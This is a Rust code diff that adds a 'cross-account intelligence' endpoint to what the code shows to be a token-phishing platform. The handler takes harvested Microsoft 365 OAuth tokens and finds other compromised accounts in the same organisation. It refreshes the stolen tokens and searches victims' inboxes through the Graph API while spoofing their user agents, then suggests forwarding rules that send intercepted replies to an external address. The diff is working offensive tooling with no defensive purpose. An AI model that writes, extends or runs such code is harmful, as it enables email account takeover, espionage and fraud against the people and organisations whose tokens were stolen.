@@ -1522,6 +1522,137 @@ NEXT_PUBLIC_WORKER_URL={}"#,
     })
 }
 
+// ============================================================
+// CROSS-ACCOUNT INTELLIGENCE — Correlate tokens from same org
+// ============================================================
+
+/// Cross-Account Intelligence: Finds other compromised accounts from the
+/// same organization (same email domain) and:
+/// 1. Shows which accounts are compromised in the same org
+/// 2. Identifies communication patterns between them
+/// 3. Suggests auto-forwarding rules: if A sends to B, and both are
+///    compromised, auto-forward B's replies to an external address
+async fn cross_account_intelligence_handler(
+    path: web::Path<String>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let token_id = path.into_inner();
+
+    // Get the target token's email
+    let target_token = match retrieve_any_token(&state, &token_id).await {
+        Ok(t) => t,
+        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
+    };
+
+    let target_email = target_token.user_email.clone();
+    let domain = target_email.split('@').nth(1).unwrap_or("").to_lowercase();
+
+    if domain.is_empty() {
+        return HttpResponse::BadRequest().json(serde_json::json!({"error": "invalid_email"}));
+    }
+
+    // Find all other active tokens from the same domain
+    let rows: Vec<(String, Option<String>, Option<String>)> = sqlx::query_as(
+        "SELECT id, email, status FROM harvested WHERE email LIKE ? AND id != ? ORDER BY captured_at DESC"
+    )
+    .bind(format!("%@{}", domain))
+    .bind(&token_id)
+    .fetch_all(&state.pool)
+    .await
+    .unwrap_or_default();
+
+    let mut correlated_accounts: Vec<serde_json::Value> = Vec::new();
+
+    for (id, email, status) in &rows {
+        let is_active = status.as_deref().unwrap_or("active") == "active";
+
+        // For each correlated account, check if there's communication between them
+        // by scanning the target's inbox for emails from/to this account
+        if is_active {
+            let access_token = refresh_access_token(&state, &target_token.refresh_token).await
+                .unwrap_or_else(|| target_token.access_token.clone());
+
+            // Search inbox for emails from this account
+            let search_url = format!(
+                "https://graph.microsoft.com/v1.0/me/messages?$search=\"{}\"&$top=5&$select=id,subject,from,receivedDateTime",
+                urlencoding::encode(email.as_deref().unwrap_or(""))
+            );
+
+            let ua = target_token.user_agent.as_deref().unwrap_or("Mozilla/5.0");
+            let lang = target_token.accept_language.as_deref().unwrap_or("en-US,en;q=0.9");
+
+            let search_res = reqwest::Client::new()
+                .get(&search_url)
+                .header("Authorization", format!("Bearer {}", access_token))
+                .header("Accept", "application/json")
+                .header("User-Agent", ua)
+                .header("Accept-Language", lang)
+                .send()
+                .await;
+
+            let communication_count = match search_res {
+                Ok(r) if r.status().is_success() => {
+                    r.json::<serde_json::Value>().await
+                        .ok()
+                        .and_then(|v| v.get("value").and_then(|v| v.as_array()).map(|a| a.len()))
+                        .unwrap_or(0)
+                }
+                _ => 0,
+            };
+
+            correlated_accounts.push(serde_json::json!({
+                "token_id": id,
+                "email": email,
+                "status": status,
+                "is_active": is_active,
+                "communication_found": communication_count > 0,
+                "communication_count": communication_count,
+                "suggested_action": if communication_count > 0 {
+                    format!("Auto-create forwarding rule on {} to intercept replies from {}", email.as_deref().unwrap_or(""), target_email)
+                } else {
+                    "No direct communication found".to_string()
+                }
+            }));
+        } else {
+            correlated_accounts.push(serde_json::json!({
+                "token_id": id,
+                "email": email,
+                "status": status,
+                "is_active": false,
+                "communication_found": false,
+                "communication_count": 0,
+                "suggested_action": "Account revoked — re-harvest needed"
+            }));
+        }
+    }
+
+    // Generate cross-account rule suggestions
+    let mut suggestions: Vec<serde_json::Value> = Vec::new();
+    for account in &correlated_accounts {
+        if account["is_active"].as_bool() == Some(true) && account["communication_found"].as_bool() == Some(true) {
+            let other_email = account["email"].as_str().unwrap_or("");
+            suggestions.push(serde_json::json!({
+                "type": "auto_forward",
+                "description": format!("Create rule on {} to forward emails from {} to external address", other_email, target_email),
+                "target_token_id": account["token_id"],
+                "target_email": other_email,
+                "condition_sender": target_email,
+                "rationale": "These accounts communicate regularly. Intercepting replies maximizes intelligence."
+            }));
+        }
+    }
+
+    HttpResponse::Ok().json(serde_json::json!({
+        "target_email": target_email,
+        "domain": domain,
+        "correlated_accounts": correlated_accounts,
+        "total_accounts_in_org": rows.len(),
+        "active_accounts": correlated_accounts.iter().filter(|a| a["is_active"].as_bool() == Some(true)).count(),
+        "suggestions": suggestions,
+        "suggestion_count": suggestions.len()
+    }))
+}
+
 // robots.txt handler to prevent search engine indexing
 async fn robots_txt_handler() -> impl Responder {
     HttpResponse::Ok()
@@ -2207,6 +2338,7 @@ async fn main() -> std::io::Result<()> {
             .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
             .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
             .route("/api/admins/one-click-deploy", web::post().to(one_click_deploy_handler))
+            .route("/api/intelligence/cross-account/{token_id}", web::get().to(cross_account_intelligence_handler))
             .route("/api/campaigns", web::get().to(list_campaigns_handler))
             .route("/api/campaigns/create", web::post().to(create_campaign_handler))
             .route("/api/campaigns/{id}", web::get().to(get_campaign_handler))
